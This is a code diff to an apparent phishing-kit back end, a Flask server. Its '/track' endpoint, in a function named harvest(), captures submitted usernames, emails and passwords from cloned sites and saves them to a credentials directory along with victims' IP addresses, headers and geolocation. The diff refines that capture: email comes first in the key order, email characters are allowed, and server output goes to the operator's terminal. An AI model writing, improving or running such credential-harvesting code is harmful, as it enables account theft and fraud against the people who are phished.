@@ -53,7 +53,6 @@ def get_client_ip():
 
 def get_client_info():
     client_ip = get_client_ip()
-    
     info = {{
         'ip': client_ip,
         'remote_addr': request.remote_addr,
@@ -68,39 +67,33 @@ def get_client_info():
         'origin': request.headers.get('Origin'),
         'timestamp': str(datetime.datetime.now())
     }}
-    
     geo_data = get_geoip_data(client_ip)
     if geo_data:
         info['geo'] = geo_data
-    
     return info
 
 def extract_username_from_data(data):
-    username_keys = ['username', 'user', 'email', 'login', 'user_id', 'name', 'account']
+    username_keys = ['email', 'username', 'user', 'login', 'user_id', 'name', 'account']
     for key in username_keys:
         if key in data and data[key] and str(data[key]).strip():
-            username = str(data[key]).strip()
-            username = re.sub(r'[<>:"/\\\\|?*]', '_', username)
-            username = username.replace(' ', '_')
-            if len(username) > 50:
-                username = username[:50]
-            return username
+            val = str(data[key]).strip()
+            # Allow @ and + in emails
+            safe = "".join(c for c in val if c.isalnum() or c in '._-+@')
+            return safe
     return "unknown"
 
 def save_credentials(data, site, session_id):
     site_dir = os.path.join(CREDS_DIR, site)
     os.makedirs(site_dir, exist_ok=True)
     
-    # Extract username
     username = extract_username_from_data(data)
-    safe_username = "".join(c for c in username if c.isalnum() or c in '._-')
+    if len(username) > 40:
+        username = username[:40]
     
-    # Generate filename with session ID
     timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S_%f")[:-3]
-    filename = site + "_" + safe_username + "_" + timestamp + "_" + session_id + ".json"
+    filename = site + "_" + username + "_" + timestamp + ".json"
     filepath = os.path.join(site_dir, filename)
     
-    # Enhanced entry with more metadata
     entry = {{
         "id": filename.replace('.json', ''),
         "timestamp": datetime.datetime.now().isoformat(),
@@ -116,7 +109,6 @@ def save_credentials(data, site, session_id):
         }}
     }}
     
-    # Save to file
     with open(filepath, 'w') as f:
         json.dump(entry, f, indent=2)
     
@@ -196,29 +188,22 @@ def serve_html_file(relpath):
 @app.route('/track', methods=['POST'])
 def harvest():
     try:
-        # Get session ID and site from headers
         session_id = request.headers.get('X-Session-ID', 'unknown')
         site = request.headers.get('X-Site', os.path.basename(CREDS_DIR))
         
-        # Parse data
         data = request.get_json(silent=True)
         if not data:
             data = request.form.to_dict()
         
-        # Handle different data formats
         if isinstance(data, dict):
-            # Check if it's a batch of events from tracking
             if 'events' in data and isinstance(data['events'], list):
-                # Handle tracking events
                 for event in data['events']:
                     save_event(event, site, session_id)
                 return jsonify({{"status": "events_received", "count": len(data['events'])}}), 200
             else:
-                # Handle credential capture
                 filename = save_credentials(data, site, session_id)
                 return jsonify({{"status": "success", "file": filename}}), 200
         elif isinstance(data, str) and data.strip():
-            # Handle raw data
             filename = save_credentials({{"raw": data.strip()}}, site, session_id)
             return jsonify({{"status": "raw_saved", "file": filename}}), 200
         else:
@@ -231,7 +216,6 @@ def harvest():
         return jsonify({{"status": "error", "message": str(e)}}), 500
 
 def save_event(event, site, session_id):
-    # Save tracking events to a separate file
     site_dir = os.path.join(CREDS_DIR, site)
     os.makedirs(site_dir, exist_ok=True)
     
@@ -247,8 +231,6 @@ def save_event(event, site, session_id):
         events = []
     
     events.append(event)
-    
-    # Keep only last 1000 events to prevent file bloat
     if len(events) > 1000:
         events = events[-1000:]
     
@@ -263,10 +245,11 @@ if __name__ == '__main__':
         PORT=port
     )
     
+    # CRITICAL FIX: stdout=None lets Flask print to your PowerShell terminal
     proc = subprocess.Popen(
         [sys.executable, "-c", server_script],
-        stdout=subprocess.PIPE,
-        stderr=subprocess.PIPE,
+        stdout=None,
+        stderr=None,
         stdin=subprocess.PIPE
     )
 
